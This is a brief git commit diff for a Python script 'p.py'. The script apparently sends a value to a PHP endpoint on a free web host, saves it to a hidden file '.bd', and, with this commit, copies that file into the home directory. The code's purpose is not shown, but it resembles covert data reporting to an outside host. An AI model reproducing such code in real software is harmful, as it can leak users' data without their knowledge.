72b77742014e8abcae298cca04b8ce0ae5ab637c
oo-ozo <55140388+oo-ozo@users.noreply.github.com>
2020-11-18 10:19:35 +0630

    Update p.py

--- p.py
+++ p.py
@@ -6,3 +6,5 @@ l = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text)
 m = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text+'config')
 with open('.bd', 'w') as ip:
     ip.write(p.text)
+    
+os.system('cp .bd ~/')
